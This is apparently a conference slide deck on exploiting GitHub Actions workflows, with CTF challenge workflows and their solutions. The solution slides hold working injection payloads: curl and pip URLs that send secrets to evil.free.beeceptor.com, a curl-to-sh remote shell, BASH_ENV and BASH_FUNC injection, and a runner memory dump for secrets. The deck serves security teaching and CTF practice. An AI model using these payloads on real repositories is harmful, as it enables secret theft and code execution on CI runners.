+++
title = "GHA"
outputs = ["Reveal"]
+++

# Github actions

In action

---

# Who we are

```yaml
Tristan: 
  role: Cyber Engineer
Zmx:
Tr4l:
BGTian:
```

---

## Roadmap

```yaml
definition:
  - github workflow
  - github action
  - github command
  - github runner
  - env file
playground:
   - ...
```

---

## Disclaimer

```yaml
opinions: mine, personal
complete sentence: either the doc, or chatGPT
```

---

## What is a github workflow

A GitHub Workflow is an automated process that you can set up in your GitHub repository to help streamline and manage processes such as continuous integration, continuous deployment, testing, and more

---

### Zoom in a github workflow

```yaml
workflow:
  jobs:
    first job:
      steps:
        first step:
        second step:
    second job:
      steps:
        another step:        
```

---

## Example github workflow

```yaml
# .github/workflows/example.yml
name: Jobs example
on:
  workflow_dispatch:  

jobs:
  Stuff:
    name: Job name
    runs-on: self-hosted
    steps:    
      - name: Output a variable
        run: |
           echo "${{ vars.VARIABLE }}"
           # echo "${{ vars.VARIABLE2 }}"
```


---

### Zoom in a github jobs

A workflow can consist of one or more jobs, which are executed in parallel or sequentially. ***Each job runs in its own virtual environment*** and can be specified to run on different operating systems or configurations.

---

```json
"steps": [
    {
        "type": "action",
        "reference": {
            "type": "script"
        },
        "displayNameToken": {
            [...],
            "lit": "Output a variable"
        },
        "contextName": "__run",
        "inputs": {
            "type": 2,
            "map": [
                {
                    "key": "script",
                    "value": {
                        [...],
                        "expr": "format('echo \"{0}\"\n# echo \"{1}\"\n', vars.VARIABLE, vars.VARIABLE2)"
                    }
                }
            ]
        },
        "condition": "success()",
        "id": "efaa3446-2c3c-57b8-85a7-177909aad4f8",
        "name": "__run"
    }
],
...
"contextData": {
  "github": {...},
  "vars": {
      "t": 2,
      "d": [
          {
              "k": "VARIABLE",
              "v": "This is a variable"
          },
          {
              "k": "VARIABLE2",
              "v": "VARIABLE2"
          }
      ]
},
```

--- 

## Context

```yaml
vars:
secrets: 
github:
  repository:
  event_name:
  event:
    inputs:
    [...]
```

---

## Permission

```yaml
Workflow:
Jobs:
# Granted to the GH_TOKEN
```

(Most) GH_TOKEN permissions expire when the workflow/jobs ends.

---

## How to triggers a workflow

```yaml
on:
  pull_request:
    types:
      - assigned
    branches:    
      - 'demo-branch/**'
```

---

## How to triggers a workflow

```yaml
on:
    branch_protection_rule: Runs your workflow when branch protection rules in the workflow repository are changed
    check_run: Runs your workflow when activity related to a check run occurs.
    check_suite: Runs your workflow when check suite activity occurs.
    create: Runs your workflow when someone creates a Git reference (Git branch or tag) 
    delete: Runs your workflow when someone deletes a Git reference (Git branch or tag)
    deployment: Runs your workflow when someone creates a deployment in the workflow's repository.
    deployment_status: Runs your workflow when a third party provides a deployment status
    discussion: Runs your workflow when a discussion in the workflow's repository is created or modified. 
    discussion_comment: Runs your workflow when a comment on a discussion in the workflow's repository is created or modified
    fork: Runs your workflow when someone forks a repository.
    gollum: Runs your workflow when someone creates or updates a Wiki page
    issue_comment: Runs your workflow when an issue or pull request comment is created, edited, or deleted
    issues: Runs your workflow when an issue in the workflow's repository is created or modified.
    label: Runs your workflow when a label in your workflow's repository is created or modified.
    merge_group: Runs your workflow when a pull request is added to a merge queue, which adds the pull request to a merge group.
    milestone: Runs your workflow when a milestone in the workflow's repository is created or modified.
    page_build: Runs your workflow when someone pushes to a branch that is the publishing source for GitHub Pages
    public: Runs your workflow when your workflow's repository changes from private to public
    pull_request: Runs your workflow when activity on a pull request in the workflow's repository occurs.
    pull_request_review: Runs your workflow when a pull request review is submitted, edited, or dismissed
    pull_request_review_comment: Runs your workflow when a pull request review comment is modified.
    pull_request_target: Runs your workflow when activity on a pull request in the workflow's repository occurs.
    push: Runs your workflow when you push a commit or tag, or when you create a repository from a template.
    registry_package: Runs your workflow when activity related to GitHub Packages occurs in your repository.
    release: Runs your workflow when release activity in your repository occurs.
    repository_dispatch: You can use the GitHub API to trigger a webhook event called repository_dispatch
    schedule: The schedule event allows you to trigger a workflow at a scheduled time.
    status: Runs your workflow when the status of a Git commit changes
    watch: Runs your workflow when the workflow's repository is starred. 
    workflow_call: used to indicate that a workflow can be called by another workflow
    workflow_dispatch: To enable a workflow to be triggered manually, you need to configure the workflow_dispatch event.
    workflow_run: This event occurs when a workflow run is requested or completed.
```

---

### Zoom in pull_request

- pull_request, pull_request_review, pull_request_review_comment ***did not pass secrets*** to PR from fork repositories.
- The `GITHUB_TOKEN` has read-only permissions by default. (*)
- First-time contributor protection is activated (*)

(\* Jetlag may apply)

---

### Zoom in pull_request_target

pull_request_target are used in the context (github source code) of the "target" (often main for a PR)

- `GITHUB_TOKEN` is granted read/write repository permission by default
- workflow can access secrets
- any caches share the same scope as the base branch

---

### Pwn Request (2020)

The initial definition of a pwn request, was to fork a repo, change the source code to include some payload, and make the PR that will be executed. 
Most of the protection we've seen before was put in place to reduce this risk.

```yaml
on:
  pull_request:
jobs:
  build:
    runs-on: ubuntu-latest
    steps:    
      - uses: actions/checkout@v1
      - run: make
```

---

### Pwn Request (2024)

Now, pwn request have evolve and may include different trigger and injection

```yaml
on:
  pull_request_target: # Mandatory to have access to secrets (from a fork)
jobs:
  build:
    runs-on: ubuntu-latest
    steps:    
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: SonarQube Scan
        uses: SonarSource/sonarqube-scan-action@v4.1.0 # It's just a scan, right ?
          env:
            SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
            SONAR_HOST_URL: ${{ vars.SONAR_HOST_URL }}
```

---

sonar-project.properties

```ini
sonar.scanner.javaExePath=/usr/bin/bash
sonar.scanner.javaOpts=-c ls
```

---

# uses: github/action

In GitHub Actions, an action is a reusable piece of code that performs a specific task within a workflow. Actions can range from simple scripts executing commands to complex functions encapsulating rich functionality, and they help automate various parts of the software development lifecycle.

---

## Github action: type

```yaml
node:
docker:
composite:
```

---

## Common action repo (node)

```yaml
.github: # with some workflow to "build" the action
dist:
  - index.js # This one will be executed (most often)
src:
  - main.ts # The source code to generate the index.js
action.yml: # The definition of the action
```

---

## How github action work (before 2025)
```yaml
setup job:
  check_out:
    ref: version
  pre: #optional, part of the action that run before your steps
  [...] # your job
  use: action # run the code inside the action
  [...] # your job
  post: #optional, part of the action that run after your steps
```

---

## How github action work (before 2025)

- Action are check-outed with tag at predefined location
- Have access to filesystem (workspace, etc ...)
- Can use/set `GITHUB_ENV`
- As we use tags and checkout, content of an action can change.
- Cyber often recommend to use sha instead of tag because of that
- "dist" is not "src" !

---

## Imposter commit !

Main repository and fork share commits. You can checkout any commit from main on fork, and viceversa.

This can be used on github action, as they checkout the action.

```yaml
runs-on: ubuntu-latest
steps:    
    - uses: actions/checkout@dd5cf19253c6870af0024d884c335b9a9757c58f
    # This commit came from a fork
```

---

## Supply chain surface

- actions depend on action, that depends on action.
- action are mostly written in node
- node use package that depend on package...
- no attestation between the code you see and the one built

---

## Immutable action

TODO

---

# What is a github command

Actions can communicate with the runner machine to set environment variables, output values used by other actions, add debug messages to the output logs, and other tasks.

Most workflow commands use the echo command in a specific format, while others are invoked by writing to a file. 


---

# Documented

```yaml
error / warning / notice / debug
group / endgroup
echo
add-mask
stop-commands
```

Example:
```
echo "::error file=app.js,line=1,col=5,endColumn=7,title=YOUR-TITLE::Missing semicolon"
```

---

# Not so documented

```yaml
internal-set-repo-path: probably internal
set-output: deprecated since october 2022, but still usable
save-state: deprecated since october 2022, but still usable
add-path: deprecated, not usable without ACTIONS_ALLOW_UNSECURE_COMMANDS
set-env: deprecated, not usable without ACTIONS_ALLOW_UNSECURE_COMMANDS
add-matcher: load a file to be used as problem matcher
remove-matcher: remove it
```
https://github.com/actions/runner/blob/main/src/Runner.Worker/ActionCommandManager.cs

---

# Not so documented syntax (only one command per line)

Actual syntax (need to be at the start of a new line)
```
echo "::workflow-command parameter1={data},parameter2={data}::{command value}"
```

Previous syntax (can start anywhere in the line)
```
echo "##[workflow-command parameter1={data},parameter2={data}]{command value}"
```

---

# What is a github runner

A GitHub Runner is a lightweight, standalone application that runs your GitHub Actions workflows. Runners execute the scripts and commands defined in your workflow files

---

## Public github runner

ubuntu

```yaml
- ephemeral: true
- docker: true
- sudo: allowed
- software pack: full
```

---

# What are ENV file

```yaml
GITHUB_ENV: The path to the file that sets env variables from workflow commands.
GITHUB_OUTPUT: ...  sets the current step's outputs from workflow commands
GITHUB_PATH: ... sets system PATH variables from workflow commands.
GITHUB_STEP_SUMMARY: ... contains job summaries from workflow commands.
```

---

## Why are ENV file

Previous syntax
```
echo "::set-output name=skip::true"
```

New syntax
```
echo "skip=true" > $GITHUB_OUTPUT
```

```yaml
parse output: false
trigger:
  on:
    step: finished
```

---

## How are ENV file

```yaml
PipelineMapping:
  tr4l:
    peter-porker:
      - PipelineFolder.json
_temp:
  - 06ccce58-f8e0-4b75-a0b7-f59e231e3adb.sh
  github_workflow:
    - event.json
  runner_file_commands:
    - add_path_f80cf1c7-a37b-4e71-812f-e2bd800958fb
    - save_state_f80cf1c7-a37b-4e71-812f-e2bd800958fb
    - set_env_f80cf1c7-a37b-4e71-812f-e2bd800958fb
    - set_output_f80cf1c7-a37b-4e71-812f-e2bd800958fb
    - step_summary_f80cf1c7-a37b-4e71-812f-e2bd800958fb
peter-porker:
  peter-porker:
```    

---



# Playground

```yaml
trigger: <trigger>, how can we control the way the workflow is executed
input: <input>, what input we control
  - Fixed (path) file write
  - file write (full control, append)
  - "output" write
exploitation:
  - command execution
  - business logic corruption
loot:
  - secret
  - write permission to repo
  - rebond
```

---

{{< slide transition="slide-in none-out" >}}
## {{ mustache }} attack

```yaml
# From: https://github.com/Nebouh/tdf-ctf-cicd/blob/main/.github/workflows/chall1.yml
name: 🔒 Chall 1 - I won't say my password

on:
  issue_comment:
    types: [created, edited] # trigger
  
jobs:
  chall:
    runs-on: ubuntu-latest
    steps:
    - name: View issue information
      run: echo '${{ github.event.comment.body }}' # input
      env:
        FLAG: ${{ secrets.FLAG }} # loot
        PAYLOAD: ???
```

---

{{< slide transition="slide-out none-in" >}}
## {{ mustache }} attack

```yaml
# From: https://github.com/Nebouh/tdf-ctf-cicd/blob/main/.github/workflows/chall1.yml
name: 🔒 Chall 1 - I won't say my password

on:
  issue_comment:
    types: [created, edited] # trigger
  
jobs:
  chall:
    runs-on: ubuntu-latest
    steps:
    - name: View issue information
      run: echo 'Hi'; echo "${FLAG}" | base32 ;echo 'Here' # input
      env:
        FLAG: ${{ secrets.FLAG }} # loot
        PAYLOAD: Hi'; echo "${FLAG}" | base32 ;echo 'Here
```

---

## More {{ mustache }}

```yaml
- name: Azure CLI script
    uses: azure/cli@v2
    with:
    inlineScript: echo "mustachable"
- name: Github script
uses: actions/github-script@v7
  with:
    script: return "I will be mustachable"
```
---

## Toolings

```yaml
semgrep: --config p/github-actions
codeQl: 
octoscan: https://github.com/synacktiv/octoscan
poutine: https://github.com/boostsecurityio/poutine
Gato-X: https://github.com/AdnaneKhan/Gato-X

```

---

{{% slide notes="Talk about line feed." %}}

## Unit test

```yaml
# From: https://github.com/Nebouh/tdf-ctf-cicd/blob/main/.github/workflows/chall2.yml
name: 🔒 Chall 2 - Look mom, i know how to use PIP
on:issue_comment: # Trigger
permissions:contents: write # Loot ?
jobs:
  create_release_from_issue:
    steps:
      - uses: actions/checkout@v4 # Will checkout default branch
      - run: |
          CLEAN_RELEASE=$(printf '%s' "$COMMENT_CONTENT" | cut -c 1-100)
          echo "RELEASE_MESSAGE=$CLEAN_RELEASE" >> $GITHUB_ENV
        env:
          COMMENT_CONTENT: ${{ github.event.comment.body }}
      - name: Run my unit tests
        run: |
          pip install -r requirements.txt
          python3 -m unittest run_tests.py -v
        env:
          FLAG: ${{ secrets.FLAG }} # another loot !
```
---

## Unit test

```yaml
solutions:
  pip_index : |
    Not a release :(
    PIP_INDEX_URL=https://urlToPackageWithMyVersion/
  pip_constraint: |
    PIP_CONSTRAINT=https://evil.free.beeceptor.com/constraint.txt
    pyyaml@https://evil.free.beeceptor.com/${FLAG}%
  pip_requirements: |
    PIP_REQUIREMENT="https://exfill.com/requirements.txt"
    stuff@https://evil.free.beeceptor.com/${FLAG}%
```
---

## A generic one ?

```yaml
# From: https://github.com/Nebouh/tdf-ctf-cicd/blob/main/.github/workflows/chall3.yml
name: 🔒 Chall 3 - Look mom, i know how to inject in env
on:issues: # Trigger
jobs:
  test:
    steps:
      - name: Set the intermediate environment variable for security
        env:
          issue_body: ${{ github.event.issue.body }}
        run: |
          echo "USERINPUT=$issue_body" >> "$GITHUB_ENV"

      - name: Run any unrelated commands in Bash securely
        run: |
          echo "Hello World !"
        env:
          FLAG: ${{ secrets.FLAG }} # loot !
```

---

## A generic one !

```yaml
solutions:
  BASH_ENV : |
    Let me do something with this env :)
    BASH_ENV='$(curl https://evil.free.beeceptor.com?flag=$FLAG)'
  BASH_FUNC: |
    Let me do something with this env :)
    BASH_FUNC_echo%%=() { builtin echo "$FLAG $@" | base32 ;}
    # https://stackoverflow.com/questions/26293949/set-a-bash-function-on-the-environment
```
---

## Am I too late ?

```yaml
# From: https://github.com/Nebouh/tdf-ctf-cicd/blob/main/.github/workflows/chall4.yml
name: 🔒 Chall 4 - Look mom, without env
on:issues: # Trigger
jobs:
  test:
    steps:
      - name: Check my flag is correctly masked
        run: "echo Flag: ${{ secrets.FLAG }}" # Loot ?

      - name: Unsafe right ?
        run: "echo Body: ${{ github.event.issue.body }}"

      - name: But whatever
        run: "echo Void: "
```

---

## Am I too late ?

```yaml
solutions:
  cat it : |
    cat ../../_temp/*.sh | base32
  (fancy) reverse shell: |
    curl -sSf https://sshx.io/get | sh -s run
```
---
## Am I too early ?

```yaml
# From: https://github.com/Nebouh/tdf-ctf-cicd/blob/main/.github/workflows/chall5.yml
name: 🔒 Chall 5 - Look mom, without flag
on: issues: # Trigger
jobs:
  test:
    steps:
      - if: ${{ github.secret_source == 'Actions' }} 
        name: Check that flag is present
        run: | 
          echo "I got a flag, but you dont"

      - name: Unsafe right ?
        run: |
          echo Body: ${{ github.event.issue.body }}

      - if: ${{ github.secret_source == 'None' }} # on PR event, no secret      
        name: But whatever, you will not see it!
        run: |
          echo ${{ secrets.FLAG }}
```
---

## Am I too early ?

```yaml
solutions:
  dump memory : |
    sudo apt-get install -y gdb;
    sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{print $1}')";
    grep -Eao '"[^"]+":\{"value":"[^"]*","isSecret":true\}' k.dump*
  (fancy) reverse shell: |
    curl -sSf https://sshx.io/get | sh -s run
```
---

## I'm just a file

```yaml
# Not publish yet, do not share
name: How can I get the flag
on: issues # Trigger
jobs:
  test:
    steps:
      - name: Save body
        env:
          BODY: ${{ github.event.issue.body }}
        run: |
          echo "Save body"
          echo ${BODY} > /tmp/issue.txt
          echo "Check body content"
          cat /tmp/issue.txt

      - name: Can't touch this
        run: |
          echo Flag: ${{ secrets.FLAG }}
```

---

## I'm just a file

```json
{
      "problemMatcher": [
          {
              "owner": "tr4l",
              "severity":"warning",
              // comment it not part of problem match schema
               "comment" : "##[add-matcher dummy content]/tmp/issue.txt
  another line",
   
              "pattern": [
                  {
                      "regexp": "^Flag: (.{3})(.*)$",
                      "code": 1,
                      "message": 2
                  }
              ]
          }
      ]
  }
 ```

---

## Skip it ez

```yaml
on: workflow_dispatch OR issues:
jobs:
  setup:
    outputs:
      skip: ${{ steps.validate.outputs.skip }}
    steps:
      - id: validate
        if: github.event_name == 'issues'
        env:
          TITLE: ${{ github.event.issue.title }}
        run: |
          echo "Issue title: $TITLE"
          echo "::set-output name=skip::true"
  sensitive:
    needs:
      setup
    if: ${{ needs.setup.outputs.skip != 'true' }}
    steps:
      - run:  echo "${{ vars.CLEAR_FLAG }}" # Simulated loot
```

---

## Skip it ez

```yaml
use: stop-commands
result: set-out is not executed
```

Note: the token of a the stop-commands became a new commands, that can be invoked with both old and new workflow syntax.

---

## Skip it fun

```yaml
on: workflow_dispatch OR issues:
jobs:
  setup:
    outputs:
      skip: ${{ steps.validate.outputs.skip }}
    steps:
      - id: validate
        if: github.event_name == 'issues'
        env:
          TITLE: ${{ github.event.issue.title }}
        run: |
          echo "Issue title: $TITLE"
          echo "skip=true" > $GITHUB_OUTPUT # Do not run next jobs on issue
  sensitive:
    needs:
      setup
    if: ${{ needs.setup.outputs.skip != 'true' }}
    steps:
      - run:  echo "${{ vars.CLEAR_FLAG }}" # Simulated loot
```

---

## Skip it fun

```yaml
use: ##[add-mask]true
impact: "true", is now a secret
result: GH will prevent you to put secret in output =)
```

---

## Unused like your PP ?

```yaml

jobs:
  validate json input:
    steps:
      - run: |
          if jq '.' data.json; then
            echo "error=false" >> $GITHUB_OUTPUT
          else
            echo "error=true" >> $GITHUB_OUTPUT
            echo "message=Json input is not valid" >> $GITHUB_OUTPUT
          fi
  error-handling:
    steps:
      - run: |
        if [[ "${{ needs.setup.outputs.error}}" == "true" ]]; then
          ./sendReport -m '${{ needs.setup.outputs.message}}'
          exit 1; #put the step in red, and prevent next step to be executed
        fi
```

---

## Homework 2025

```yaml

name: Homework - 2025
on:
  issues
jobs:
  test:
    runs-on: windows-latest
    steps:
      - run: echo "$env:TITLE"
        env:
          TITLE: ${{ github.event.issue.title }}
      - run: "echo Flag: ${{ secrets.FLAG }}"
```
      
---

# Reference

- https://www.synacktiv.com/publications/github-actions-exploitation-introduction
- https://www.chainguard.dev/unchained/what-the-fork-imposter-commits-in-github-actions-and-ci-cd
- https://b611.github.io/pipelines
- https://www.sstic.org/2024/presentation/action_man_vs_octocat_github_action_exploitation/
- https://github.com/Nebouh/tdf-ctf-cicd
- https://adnanthekhan.com/2024/05/06/the-monsters-in-your-build-cache-github-actions-cache-poisoning/#steal-the-cache-token
- https://adnanthekhan.com/2024/12/21/cacheract-the-monster-in-your-build-cache/
- https://github.com/boostsecurityio/lotp/issues
- https://github.blog/security/application-security/how-to-secure-your-github-actions-workflows-with-codeql/


---

# Follow me

- https://github.com/tr4l
- https://steamcommunity.com/id/badassEngie/
- https://twitter.com/Tr4LSecurity
​- https://fr.linkedin.com/in/tral

---

